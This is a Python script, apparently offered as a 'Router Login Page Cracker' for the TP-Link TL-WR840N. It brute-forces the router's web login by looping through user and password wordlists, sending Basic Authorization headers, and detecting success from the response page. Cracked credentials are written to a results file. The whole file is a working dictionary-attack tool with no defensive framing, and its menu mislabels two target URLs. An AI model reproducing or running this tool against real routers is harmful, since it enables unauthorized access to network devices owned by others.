import requests, base64

stop_line = 'MenuRpm.htm'

def get_cookie(user, password):
    # Tp-Link router use this format for sending Authorization data
    Authorization = 'Basic ' + base64.b64encode(f'{user}:{password}'.encode()).decode()
    return dict(Authorization=Authorization)
    
def back():
    while True:
        r = input('\n[??] - Back to menu(y/n): ')
        if r in ['y', 'Y']:
            menu()
        elif r in ['n', 'N']:
            exit(0)
        else:
            print('[!] - Please provide y or n')

def get_splited_line(pth):
    return open(pth, 'r').read().splitlines()

def attack(user_list, pass_list):
    while True:
        print('\nChoose ip -->\n  1 -- http://192.168.0.1/\n  2 -- http://192.168.0.1/userRpm/LoginRpm.htm/\n  3 -- Custom')
        ii = input('--> ')
        if ii == '1':
            ip = 'http://192.168.0.1/userRpm/LoginRpm.htm/'
        elif ii == '2':
            ip = 'http://192.168.0.1/'
        elif ii == '3':
            ip = 'http://' + input('[?] - IP - http://')
        if ii in ['1','2','3']:
            break

    print(f'[+] - Target ip - {ip}')
    while True:
        ans = input('[?] - Start (y/n) : ')
        if ans == 'y':
            break
        elif ans == 'n':
            back()

    print(f'[+] - Starting ')
    stop = False
    for user in user_list:
        if stop:
            break
        for password in pass_list:
            if user.strip() != '' and password.strip() != '':
                print(f'\n[+] - Executing attack - [+]\n[+] - User: '+user+'  &  Password: '+password)
                try:
                    r = requests.get(ip, cookies=get_cookie(user, password), params={'Save': 'Save'})
                except Exception as e:
                    print('\n[!] - GOT ERROR -->\n', e, '\n\n[!] - Got an error. Please check your network or program')
                    stop = True
                    break
                resp = r.status_code
                if stop_line != '' and stop_line in r.text:
                    print(f'\n[!!] - OwO! CRACKED - {resp}\n[!!] - User: '+user+ '\n[!!] - Password: '+password)
                    response = open('result.txt','a')
                    response.write('\n'+ip+', '+user+', '+password)
                    response.close()
                    print("[!] - Result saved to 'result.txt'")
                    ans = input('\n[?] - Wanna print the content? ')
                    if ans == 'y':
                        print('\n\n', r.text, '\n\n')
                    stop = True
                    break
                else:
                    print(f'[+] - Failed - Status [{resp}]')

    if not stop:
        print('\n[!] - Failed to crack')
    back()

def menu():
    print( '\n  Router Login Page Cracker')
    print( '       Made for TL-WR840N')
    print( '        Dictionary Attack')
    print( '         By @codernayeem')
    print( '\n   --> MENU <--')
    print( '[1] - Small Attack')
    print( '[2] - Big Attack')
    print( '[3] - Exit')
    r = input('\nSelect a option[1-3]: ')
    if r == '1':
        try:
            attack(get_splited_line('small_user.txt'), get_splited_line('small_pass.txt'))
        except FileNotFoundError:
            print('[+] - Wordlist not found. Please make sure you have "small_pass.txt" and "small_user.txt" in the same directory')
    elif r == '2':
        try:
            attack(get_splited_line('big_user.txt'), get_splited_line('big_pass.txt'))
        except FileNotFoundError:
            print('[+] - Wordlist not found. Please make sure you have "big_pass.txt" and "big_user.txt" in the same directory')
    elif r == '3':
        exit()
    else:
        print('[+] - Invalid choice.')
        menu()

if __name__ == "__main__":
    menu()
